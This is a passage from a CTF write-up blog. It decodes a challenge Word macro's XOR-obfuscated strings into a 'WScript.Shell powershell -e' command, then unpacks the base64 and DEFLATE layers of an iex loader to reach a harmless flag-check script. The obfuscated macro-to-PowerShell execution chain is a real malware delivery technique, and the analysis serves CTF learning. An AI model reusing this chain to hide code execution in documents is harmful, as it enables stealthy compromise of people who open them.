“3K1WddVO4bwcKlQb14luWJzBsDwrD8u7vi8LTRIe6A982G0Oygf6+Am9m2GIkp6eSWY3tSF&#x2F;cOpmuWc+d1RCPzO5eEAm6TWT0ULWZ5QAMD31GObEpVRZ+eoCuDSckd0JvrP2lBSbZKRADL0unq3vhnmyTmflpvtH15ahJ+9mxgHGH2exGX6vgBx17iyx5T4WtBowQsIW310F1QrH6xNfvwM9PLv&#x2F;3czSXs&#x2F;&#x2F;jUDSB&#x2F;AN60pVccuZtfPvp+ZMg6d9l0UKNiWIq7CMKbE7Z7BWWjNEMBPdfGbNzmQULvHXOXpnlZeyNd0ht57x9PljoFDD6N+sEuJ2DRprg7&#x2F;qNZRJekOAF&#x2F;VIID2SPgDfCkRhLg+Xq5KgysBO4U5nWKGD0IM1TYcc24pbCY31beUlebiKc2aS7MtxQ+o41wQaJQ8Ys5h13jeNgpUz5Vzc6BGWDUm6+X+Jqu&#x2F;NK1qUy8Vmb5wXVl6BqFt6Y7yEGWv31QKTiVwyKWbuV+pRRYf3NvAqRX6n”<br>  “d1zFmAyuzoiVe1masPkUUjz2+uacpn8DuVpKrDJF64UDt4yhEeBsLHykecS+&#x2F;r0pwEBGJdP&#x2F;Vd&#x2F;Y3OJ4MFUqnF9UvaYfrFG7trJQepnGH2DE4WTFna70hp9Fxx8LaJMI8lxfwBDxH5Z56kkF+j4hLuzq48vpQNId4tn+rFfFeHwp2GuZrVMkyQ1SVSDW9uUAjWu6ROhPEGwyjnjM2cG6MJQmphOD8bIfjGnOAscgU0d6FN0BHzRtx85xZwO1Vw&#x3D;&#x3D;”<br>)<br>key &#x3D; base64decode(key_b64)<br>​<br># 所有 ciphertext Array（按照 VBA 中顺序）<br>arrays &#x3D; [<br> ([135, 46, 140, 24, 228, 225, 126, 169, 34, 40, 56], 3),<br> ([201, 1], 14),<br> ([137, 123, 117, 87, 89, 140, 200, 174, 138, 204, 135, 229, 75, 9, 168, 39, 117, 219, 2, 212, 118, 230, 128, 213, 197, 44, 99, 93, 193, 144, 49, 210, 70, 175, 228, 16, 187, 75, 36, 215, 144, 31, 223, 159, 127, 45, 9, 205, 183, 34], 16),<br> ([199, 228, 3, 153, 81, 192, 25, 128, 137, 147, 136, 23, 7, 80, 224, 108, 203, 255, 197, 21, 174, 66, 117, 184, 52, 127, 71, 19, 183, 239, 29, 155, 18, 223, 159, 241, 35, 183, 202, 179, 22, 101, 99, 100, 54, 218, 32, 33, 142, 198, 175, 159, 29, 205, 110, 154, 65, 22, 247, 152, 91, 192, 108, 145, 58, 203, 25, 158, 99, 37, 128, 229, 54, 60, 38, 178, 134, 208, 68, 38, 39, 99, 76, 155, 56, 147, 53, 156, 203], 66),<br> ([102, 198, 208, 164, 182, 203, 117, 231, 127, 219, 94, 126, 10, 162, 173, 72, 207, 156, 150, 219, 167, 117, 27, 172, 242, 233, 32, 72, 61, 65, 178, 142, 245, 133, 139, 29, 181, 134, 18, 199, 242, 233, 14, 5, 134, 127, 212, 91, 91, 8, 171, 90, 25, 109, 198, 97, 6, 157, 10, 45, 214, 27, 185, 134, 246, 145, 32, 196, 221, 131, 137, 27, 100, 146, 80, 67, 177, 161, 71, 193, 155, 175, 42, 192, 227, 172, 239, 123, 92], 155),<br> ([234, 141, 79, 179, 223, 15, 203, 43, 171, 112, 201, 234, 98, 141, 170, 14, 174, 104, 46, 107, 122, 18, 176, 138, 238, 208, 78, 126, 217, 208, 197, 2, 219, 144, 118, 145, 213, 45, 173, 225, 233, 161, 66, 174, 198, 108, 46, 184, 249, 150, 178, 36, 223, 5, 41, 60, 105, 114, 110, 110, 40, 134, 139, 35, 41, 235, 57, 182, 60, 105, 58, 175, 196, 240, 224, 144, 250, 156, 14, 138, 217, 9, 147, 115, 55, 194, 186, 162, 79], 244),<br> ([209, 193, 20, 114, 189, 230, 8, 167, 240, 61, 224, 242, 135, 166, 38, 7, 87, 151, 117, 148, 46, 97, 158, 117, 106, 143, 40, 126, 199, 26, 83, 196, 211, 16, 152, 203, 123, 22, 248, 60, 127, 38, 179, 12, 140, 170, 29, 148, 133, 77, 82, 213, 53, 92, 146, 151, 236, 151, 74, 37, 118, 16, 28, 157, 49, 18, 131, 195, 167, 133, 54, 214, 12, 248, 32, 108, 36, 131, 65, 250, 97, 12, 26, 10, 182, 16, 34, 15, 10], 333),<br> ([81, 75, 148, 28, 3, 254, 84, 127, 57, 78, 30, 146, 239, 82, 115, 175, 20, 208, 87, 218, 140, 50, 189, 210, 111, 35, 12, 128, 1, 116, 208, 150, 230, 88, 166, 120, 35, 106, 166, 121, 243, 216, 251, 46, 25, 196, 102, 54, 130, 52, 233, 123, 103, 240, 146, 114, 144, 49, 205, 121, 89, 126, 226, 239, 23, 51, 71, 7, 184, 111, 154, 71, 39, 28, 191, 99, 43, 237, 59, 241, 187, 84, 205, 162, 82, 62, 227, 183, 145], 422),<br> ([220, 194, 134, 110, 158, 136, 28, 157, 6, 28, 18, 29, 219, 15, 42, 69, 202, 26, 210, 214, 48, 60, 156, 210, 88, 81, 191, 153, 36, 72, 192, 205, 71, 101, 125, 96, 84, 172, 113, 120, 112, 252, 31, 16, 92, 180, 3, 4, 127, 58, 214, 173, 165, 31, 64, 250, 139, 176, 79, 89, 136, 249, 48, 37, 153, 201, 184, 51, 155, 186, 96, 121, 74, 163, 28, 131, 230, 74, 186, 237, 17, 163, 101, 17, 51, 1, 78, 40, 101], 511),<br> ([173, 96, 11, 202, 44, 219, 158, 69, 217, 56, 179, 84, 118, 152, 185, 163, 20, 92, 3, 211, 142, 226, 92, 27, 150, 191, 222, 95, 105, 58, 87, 200, 109, 108, 90, 41, 190, 252, 39, 215, 215, 150, 117, 140, 19, 0, 206, 174, 60, 83, 253, 136, 153, 112, 28, 55, 54, 1, 131, 65, 74, 92, 97, 135, 64, 80, 192, 181, 183, 54, 130, 9, 197, 65, 182, 38, 196, 1, 248, 217, 155, 50, 57, 1, 135, 114, 53, 68, 126], 600),<br> ([246, 123, 20, 204, 50, 152, 85, 111, 106, 210, 2, 247, 48, 159, 65, 255, 33, 131, 91, 157, 245, 204, 232, 223, 23, 163, 243, 109, 81, 181, 198, 99, 13, 150, 202, 151, 133, 228, 53, 192, 53, 212, 255, 30, 218, 222, 76, 176, 230, 46, 127, 0, 251, 133, 0, 75, 6, 98, 143, 221, 135, 70, 86, 153, 72, 105, 167, 91, 77, 86, 67, 240, 157, 143, 239, 49, 103, 247, 44, 158, 232, 23, 50, 225, 15, 179, 237, 94, 120], 689),<br> ([21, 83, 142, 200, 60, 47, 222, 133, 241, 121, 102, 78, 134, 204, 252, 118, 74, 8, 97, 95, 138, 94, 62, 159, 44, 75, 147, 70, 175, 185, 75, 205, 218, 38, 251, 211, 199, 207, 11, 12, 118, 242, 74, 62, 19, 187, 36, 239, 38, 120, 58, 21, 17, 110, 113, 192, 57, 6, 111, 168, 102, 244, 147, 53, 151, 47, 247, 65, 123, 74, 183, 87, 167, 131, 236, 21, 60, 168, 168, 109, 249, 113, 164, 208, 138, 110, 252, 219, 183], 778),<br> ([220, 77, 218, 41, 229, 2, 88, 252, 106, 253, 236, 187, 215, 59, 193, 15, 32, 150, 231, 159, 48, 149, 160, 224, 111, 182, 39, 147, 118, 135, 109, 38, 249, 118, 63, 205, 247, 94, 37, 175, 100, 222, 164, 108, 71, 245, 42, 113, 7, 181, 87, 188, 28, 71, 172, 75, 129, 136, 82, 8, 238, 65, 105, 125, 243, 190, 156, 168, 181, 28, 153, 190, 197, 25, 147, 84, 135, 79, 188, 11, 18, 30, 138, 195, 228, 177, 172, 230, 163], 867),<br> ([116, 194, 246, 44, 213, 63, 75, 126, 78, 201, 230, 241, 205, 28, 240, 125, 46, 241, 50, 61, 113, 118, 113, 86, 190, 61, 41, 156, 140, 82, 85, 106, 154, 150, 116, 59, 37, 253, 214, 245, 112, 156, 68, 246, 220, 182, 181, 189, 58, 225, 9, 164, 170, 238, 237, 86, 187, 55, 95, 125, 41, 240, 254, 175, 112, 213, 7, 13, 2, 246, 86, 176, 29, 97, 105, 229, 127, 121, 158, 77, 51, 32, 116, 104, 213, 158, 211, 231, 161], 956),<br> ([129, 43, 134, 12, 8, 25, 228, 210, 145, 230, 100, 15, 197, 93, 157, 207, 26, 89, 220, 180, 84, 164, 102, 26, 249, 193, 34, 39, 225, 173, 136, 48, 2, 189, 79, 149, 126, 91, 99, 100, 89, 230, 239, 55, 238, 118, 200, 215, 212, 103, 180, 29, 169, 169, 86, 253, 76, 43, 205, 184, 10, 200, 239, 162, 140, 127, 45, 214, 133, 132, 32, 46, 221, 66, 49, 28, 237, 233, 29, 55, 34, 233, 243, 91, 27, 182, 146, 58, 210], 1045),<br> ([221, 59, 115, 92, 39, 169, 26, 171, 5, 50, 197, 131, 119, 184, 107, 4, 29, 192, 53, 48, 132, 208, 65, 239, 155, 255, 215, 11, 24, 223, 136, 184, 64, 53, 126, 130, 187, 163, 164, 231, 37, 66, 251, 28, 11, 234, 2, 4, 164, 226, 66, 129, 205, 228, 64, 161, 54, 125, 62, 224, 56, 131, 134, 191, 223, 120, 130, 17, 7, 109, 154, 190, 7, 142, 154, 136, 163, 62, 125, 20, 97, 205, 30, 51, 252, 229, 116, 237, 29], 1134),<br> ([250, 244, 208, 17, 50, 212, 135, 122, 49, 134, 155, 37, 131, 204, 239, 166, 215, 221, 49, 134, 92, 63, 41, 197, 73, 176, 26, 30, 134, 119, 176, 123, 215, 56, 159, 8, 66, 175, 127, 67, 73, 174, 128, 162, 142, 209, 1, 136, 92, 160, 147, 191, 233, 99, 132, 42, 11, 107, 188, 42, 221, 194, 18, 107, 174, 79, 16, 20, 104, 155, 183, 188, 119, 207, 27, 251, 1, 131, 14, 91, 61, 115, 233, 57, 143, 178, 128, 246, 87], 1223),<br> ([214, 95, 231, 84, 214, 176, 235, 78, 206, 44, 143, 68, 150, 97, 49, 48, 56, 82, 156, 68, 43, 117, 63, 134, 143, 30, 38, 64, 222, 22], 1312)<br>]<br>​<br>​<br># 拼接解密结果<br>result &#x3D; “”<br>for arr, start in arrays:<br>  result +&#x3D; unxor(arr, start, key)<br>​<br>print(“解密结果:”, result)<br>​<br>​<br>#解密结果: WScript.Shellpowershell -e LgAoACcAaQBlAFgAJwApACgAbgBFAHcALQBvAGIAagBFAGMAdAAgAFMAWQBzAHQAZQBNAC4ASQBvAC4AUwB0AFIAZQBBAE0AcgBlAGEAZABFAHIAKAAgACgAIABuAEUAdwAtAG8AYgBqAEUAYwB0ACAAIABTAHkAcwB0AEUATQAuAEkATwAuAEMATwBNAFAAUgBFAHMAcwBpAE8ATgAuAGQAZQBmAGwAYQBUAEUAUwB0AHIAZQBhAE0AKABbAEkAbwAuAE0AZQBtAG8AUgB5AHMAVABSAEUAQQBNAF0AIABbAHMAWQBzAFQAZQBNAC4AYwBPAG4AdgBFAHIAVABdADoAOgBmAFIATwBNAEIAQQBTAEUANgA0AFMAVAByAGkAbgBnACgAIAAnAGIAYwA2ADkAQwBzAEkAdwBHAEkAWABoAFAAVgBmAHgARwBSAHcAVQBMAEwAUwBrAGsAcwBsAEIAQgBYADkAQQBVAEIAdwBVAHAAOQBBAG0AbgA3AFEAUQBtADUAcQBrAFIAcABIAGUAdQB5ADAANgBPAHAAOABIAHoAbwB1AHkATQBFAEEAdgA2AEMAWQBRAEUATABSADUASQBKAHcAVwA4AHcARQBsAFoARgBoAFcAZABlAE4AaABCAGsAZgBNAFYATABRAHgAegBnAE0AOQBaAE0ANABGAFkAMQBVADMAbAAxAGMAWQAvAFUAaQBFAGQANgBDAHIAMwBYAHoAOQBEAG4ARQBRAHYARwBDAEMAMwBYAEsAbQBGAEYAUABpAGsAYQBjAGkAcQBVAFMASQByAFIASgBwAHcAKwBOAGIAeQBoAE8AWgBhAHYAMABTADcATQBsAGsAdwB6AHYAUwArAHoAbwBPAHoARQA0AEwAcAByAFcAWQBTAHAAdgBVAHYASwBWAGoAZQBCAE8AQQBzAHkAMAA5AFIAdgB2AEcAOQB6ADkAMABhAGEAeABGADYAYgB1ADYARgBsAEEANwAvAEUATwAyAGwAZgB5AGkAegBoAEQAeQBBAFEAPQA9ACcAKQAsACAAWwBzAFkAUwB0AEUATQAuAGkAbwAuAEMATwBNAFAAUgBlAFMAUwBpAG8ATgAuAGMATwBtAHAAcgBlAHMAUwBpAE8ATgBtAE8AZABFAF0AOgA6AEQAZQBDAG8AbQBQAHIARQBTAFMAKQAgACkALABbAHMAeQBzAFQARQBtAC4AVABFAFgAdAAuAGUAbgBjAE8AZABJAE4ARwBdADoAOgBBAHMAYwBpAEkAKQAgACkALgByAGUAYQBEAFQAbwBFAE4ARAAoACkA</p>
<p>Base64 编码的 PowerShell 命令</p>
<p>import base64<br>​<br>encoded &#x3D; “LgAoACcAaQBlAFgAJwApACgAbgBFAHcALQBvAGIAagBFAGMAdAAgAFMAWQBzAHQAZQBNAC4ASQBvAC4AUwB0AFIAZQBBAE0AcgBlAGEAZABFAHIAKAAgACgAIABuAEUAdwAtAG8AYgBqAEUAYwB0ACAAIABTAHkAcwB0AEUATQAuAEkATwAuAEMATwBNAFAAUgBFAHMAcwBpAE8ATgAuAGQAZQBmAGwAYQBUAEUAUwB0AHIAZQBhAE0AKABbAEkAbwAuAE0AZQBtAG8AUgB5AHMAVABSAEUAQQBNAF0AIABbAHMAWQBzAFQAZQBNAC4AYwBPAG4AdgBFAHIAVABdADoAOgBmAFIATwBNAEIAQQBTAEUANgA0AFMAVAByAGkAbgBnACgAIAAnAGIAYwA2ADkAQwBzAEkAdwBHAEkAWABoAFAAVgBmAHgARwBSAHcAVQBMAEwAUwBrAGsAcwBsAEIAQgBYADkAQQBVAEIAdwBVAHAAOQBBAG0AbgA3AFEAUQBtADUAcQBrAFIAcABIAGUAdQB5ADAANgBPAHAAOABIAHoAbwB1AHkATQBFAEEAdgA2AEMAWQBRAEUATABSADUASQBKAHcAVwA4AHcARQBsAFoARgBoAFcAZABlAE4AaABCAGsAZgBNAFYATABRAHgAegBnAE0AOQBaAE0ANABGAFkAMQBVADMAbAAxAGMAWQAvAFUAaQBFAGQANgBDAHIAMwBYAHoAOQBEAG4ARQBRAHYARwBDAEMAMwBYAEsAbQBGAEYAUABpAGsAYQBjAGkAcQBVAFMASQByAFIASgBwAHcAKwBOAGIAeQBoAE8AWgBhAHYAMABTADcATQBsAGsAdwB6AHYAUwArAHoAbwBPAHoARQA0AEwAcAByAFcAWQBTAHAAdgBVAHYASwBWAGoAZQBCAE8AQQBzAHkAMAA5AFIAdgB2AEcAOQB6ADkAMABhAGEAeABGADYAYgB1ADYARgBsAEEANwAvAEUATwAyAGwAZgB5AGkAegBoAEQAeQBBAFEAPQA9ACcAKQAsACAAWwBzAFkAUwB0AEUATQAuAGkAbwAuAEMATwBNAFAAUgBlAFMAUwBpAG8ATgAuAGMATwBtAHAAcgBlAHMAUwBpAE8ATgBtAE8AZABFAF0AOgA6AEQAZQBDAG8AbQBQAHIARQBTAFMAKQAgACkALABbAHMAeQBzAFQARQBtAC4AVABFAFgAdAAuAGUAbgBjAE8AZABJAE4ARwBdADoAOgBBAHMAYwBpAEkAKQAgACkALgByAGUAYQBEAFQAbwBFAE4ARAAoACkA”  # 你的字符串<br>decoded_bytes &#x3D; base64.b64decode(encoded)    # Base64 解码<br>decoded_str &#x3D; decoded_bytes.decode(‘utf-16le’) # UTF-16 LE 解码<br>​<br>print(decoded_str)<br>​<br>##.(‘ieX’)(nEw-objEct SYsteM.Io.StReAMreadEr( ( nEw-objEct SystEM.IO.COMPREssiON.deflaTEStreaM([Io.MemoRysTREAM] [sYsTeM.cOnvErT]::fROMBASE64STring( ‘bc69CsIwGIXhPVfxGRwULLSkkslBBX9AUBwUp9Amn7QQm5qkRpHeuy06Op8HzouyMEAv6CYQELR5IJwW8wElZFhWdeNhBkfMVLQxzgM9ZM4FY1U3l1cY&#x2F;UiEd6Cr3Xz9DnEQvGCC3XKmFFPikaciqUSIrRJpw+NbyhOZav0S7MlkwzvS+zoOzE4LprWYSpvUvKVjeBOAsy09RvvG9z90aaxF6bu6FlA7&#x2F;EO2lfyizhDyAQ&#x3D;&#x3D;’), [sYStEM.io.COMPReSSioN.cOmpresSiONmOdE]::DeComPrESS) ),[sysTEm.TEXt.encOdING]::AsciI) ).reaDToEND()</p>
<p>典型的混淆压缩 Base64 payload 解码脚本</p>
<p>import base64<br>import zlib<br>​<br># 1. Base64 字符串<br>b64_data &#x3D; ‘bc69CsIwGIXhPVfxGRwULLSkkslBBX9AUBwUp9Amn7QQm5qkRpHeuy06Op8HzouyMEAv6CYQELR5IJwW8wElZFhWdeNhBkfMVLQxzgM9ZM4FY1U3l1cY&#x2F;UiEd6Cr3Xz9DnEQvGCC3XKmFFPikaciqUSIrRJpw+NbyhOZav0S7MlkwzvS+zoOzE4LprWYSpvUvKVjeBOAsy09RvvG9z90aaxF6bu6FlA7&#x2F;EO2lfyizhDyAQ&#x3D;&#x3D;’<br>​<br># 2. Base64 解码<br>compressed_bytes &#x3D; base64.b64decode(b64_data)<br>​<br># 3. DEFLATE 解压（PowerShell 的 DeflateStream 对应 zlib.decompress）<br># 注意：DeflateStream 不包含 zlib 头，所以使用 -15 window bits<br>decompressed_bytes &#x3D; zlib.decompress(compressed_bytes, -15)<br>​<br># 4. 按 ASCII 编码读取<br>decoded_script &#x3D; decompressed_bytes.decode(‘ascii’)<br>​<br>print(decoded_script)<br>​<br>​</p>
<p>最后结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;Yes, we love VBA!&quot;</span><br><span class="line"></span><br><span class="line">$input = Read-Host &quot;Password&quot;</span><br><span class="line"></span><br><span class="line">if ($input -eq &quot;FLAG&#123;w0w_7h3_3mb3dd3d_vb4_1n_w0rd_4u70m471c4lly_3x3cu73d_7h3_p0w3r5h3ll_5cr1p7&#125;&quot;) &#123;</span><br><span class="line"> Write-Output &quot;Correct!&quot;</span><br><span class="line">&#125; else &#123;</span><br><span class="line"> Write-Output &quot;Incorrect&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="c-wgb"><a href="#c-wgb" class="headerlink" title="c-wgb"></a>c-wgb</h2><p>使用ida进行逆向分析</p>
<p>找到ba函数就发现flag直接有了</p>
<p><img   src="C:/Users/Administrator/Desktop/111/wps8.jpg"  alt="img"> </p>

                    
                </div>

                

                <div class="post-bottom-tags-and-share border-box">
                    <div>
                        
                            <ul class="post-tags-box border-box">
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/WP/">WP</a>
                                    </li>
                                
                            </ul>
                        
                    </div>
                    <div>
                        
                            <div class="post-share-container border-box">
    <ul class="share-list-wrap border-box">
        <li class="qq share-item border-box flex-center tooltip"
            data-tooltip-content="Share to QQ"
        >
            <i class="fa-brands fa-qq"></i>
        </li>
        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
            data-tooltip-content="Share to WeChat"
            data-tooltip-img-tip="Scan by WeChat"
            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
        >
            <i class="fa-brands fa-weixin"></i>
        </li>
        <li class="weibo share-item border-box flex-center tooltip"
            data-tooltip-content="Share to WeiBo"
        >
            <i class="fa-brands fa-weibo"></i>
        </li>
    </ul>
</div>

                        
                    </div>
                </div>

                

                
                    <div class="post-nav border-box">
                        
                            <div class="prev-post">
                                <a class="prev"
                                   rel="prev"
                                   href="/2025/09/22/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%99%87%E5%89%91%E6%9D%AF%E5%86%B3%E8%B5%9B/"
                                   title="第三届陇剑杯决赛"
                                >
                                    <span class="left arrow-icon flex-center">
                                        <i class="fas fa-chevron-left"></i>
                                    </span>
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">第三届陇剑杯决赛</span>
                                        <span class="post-nav-item">Prev posts</span>
                                    </span>
                                </a>
                            </div>
                        
                        
                            <div class="next-post">
                                <a class="next"
                                   rel="next"
                                   href="/2025/09/10/SROP/"
                                   title="SROP"
                                >
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">SROP</span>
                                        <span class="post-nav-item">Next posts</span>
                                    </span>
                                    <span class="right arrow-icon flex-center">
                                        <i class="fas fa-chevron-right"></i>
                                    </span>
                                </a>
                            </div>
                        
                    </div>
                

                
                    






                
            </div>
        </div>

        
            <div class="pc-post-toc right-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn"><span class="nav-number">1.</span> <span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%87%91%E4%B8%9D%E9%9B%80-wgb"><span class="nav-number">1.1.</span> <span class="nav-text">金丝雀-wgb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#zeroday-wgb"><span class="nav-number">1.2.</span> <span class="nav-text">zeroday-wgb</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">2.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9C%9F%E5%81%87%E4%B9%8B%E9%97%B4-wgb"><span class="nav-number">2.1.</span> <span class="nav-text">真假之间-wgb</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">3.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Format-8bit-wgb"><span class="nav-number">3.1.</span> <span class="nav-text">Format-8bit-wgb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#non-interlaced-wgb"><span class="nav-number">3.2.</span> <span class="nav-text">non-interlaced-wgb</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CRY"><span class="nav-number">4.</span> <span class="nav-text">CRY</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%81%E4%B9%A6%E4%BF%AE%E5%A4%8D-wgb"><span class="nav-number">4.1.</span> <span class="nav-text">证书修复-wgb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E9%87%8D%E7%A7%98%E5%BD%B1-wgb"><span class="nav-number">4.2.</span> <span class="nav-text">三重秘影-wgb</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#reverse"><span class="nav-number">5.</span> <span class="nav-text">reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#re1-NewRC4-wgb"><span class="nav-number">5.1.</span> <span class="nav-text">re1-NewRC4-wgb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%97%E6%B3%95%E7%BB%84%E5%90%88-wgb"><span class="nav-number">5.2.</span> <span class="nav-text">算法组合-wgb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BB%A1%E6%B1%9F%E7%BA%A2-wgb"><span class="nav-number">5.3.</span> <span class="nav-text">满江红-wgb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#c-wgb"><span class="nav-number">5.4.</span> <span class="nav-text">c-wgb</span></a></li></ol></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>
        </div>

        <div class="page-main-content-bottom border-box">
            
<footer class="footer border-box">
    <div class="copyright-info info-item">
    &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2025
    
            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">zach0ry</a>
        
    </div>

    <div class="theme-info info-item">
        Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
    </div>

    

    

    
</footer>

        </div>
    </div>

    <!-- post tools -->
    
        <div class="post-tools right-toc">
            <div class="post-tools-container border-box">
    <ul class="post-tools-list border-box">
        <!-- PC encrypt again -->
        

        <!-- PC TOC show toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- PC go comment -->
        

        <!-- PC full screen -->
        <li class="tools-item flex-center full-screen">
            <i class="fa-solid fa-expand"></i>
        </li>
    </ul>
</div>

        </div>
    

    <!-- side tools -->
    <div class="side-tools">
        <div class="side-tools-container border-box ">
    <ul class="side-tools-list side-tools-show-handle border-box">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <!-- toggle mode -->
        
            <li class="tools-item tool-toggle-theme-mode flex-center">
                <i class="fas fa-moon"></i>
            </li>
        

        <!-- rss -->
        

        <!-- to bottom -->
        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list border-box">
        
            <li class="tools-item toggle-show-toc-tablet flex-center">
                <i class="fas fa-list"></i>
            </li>
        

        

        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>

        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
            <i class="arrow fas fa-arrow-up"></i>
            <span class="percent"></span>
        </li>
    </ul>
</div>

    </div>

    <!-- image mask -->
    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    <!-- local search -->
    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="Search..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

    <!-- tablet toc -->
    
        <div class="tablet-post-toc-mask">
            <div class="tablet-post-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn"><span class="nav-number">1.</span> <span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%87%91%E4%B8%9D%E9%9B%80-wgb"><span class="nav-number">1.1.</span> <span class="nav-text">金丝雀-wgb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#zeroday-wgb"><span class="nav-number">1.2.</span> <span class="nav-text">zeroday-wgb</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">2.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9C%9F%E5%81%87%E4%B9%8B%E9%97%B4-wgb"><span class="nav-number">2.1.</span> <span class="nav-text">真假之间-wgb</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">3.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Format-8bit-wgb"><span class="nav-number">3.1.</span> <span class="nav-text">Format-8bit-wgb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#non-interlaced-wgb"><span class="nav-number">3.2.</span> <span class="nav-text">non-interlaced-wgb</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CRY"><span class="nav-number">4.</span> <span class="nav-text">CRY</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%81%E4%B9%A6%E4%BF%AE%E5%A4%8D-wgb"><span class="nav-number">4.1.</span> <span class="nav-text">证书修复-wgb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E9%87%8D%E7%A7%98%E5%BD%B1-wgb"><span class="nav-number">4.2.</span> <span class="nav-text">三重秘影-wgb</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#reverse"><span class="nav-number">5.</span> <span class="nav-text">reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#re1-NewRC4-wgb"><span class="nav-number">5.1.</span> <span class="nav-text">re1-NewRC4-wgb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%97%E6%B3%95%E7%BB%84%E5%90%88-wgb"><span class="nav-number">5.2.</span> <span class="nav-text">算法组合-wgb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BB%A1%E6%B1%9F%E7%BA%A2-wgb"><span class="nav-number">5.3.</span> <span class="nav-text">满江红-wgb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#c-wgb"><span class="nav-number">5.4.</span> <span class="nav-text">c-wgb</span></a></li></ol></li></ol>
    </div>
</div>

            </div>
        </div>
    
</main>





<!-- common js -->

<script src="/js/utils.js"></script>

<script src="/js/header-shrink.js"></script>

<script src="/js/back2top.js"></script>

<script src="/js/toggle-theme.js"></script>

<script src="/js/code-block.js"></script>

<script src="/js/main.js"></script>

<script src="/js/libs/anime.min.js"></script>


<!-- local search -->

    
<script src="/js/local-search.js"></script>



<!-- lazyload -->


<div class="">
    <!-- home page -->
    

    <!-- post page -->
    
        <!-- post-helper -->
        
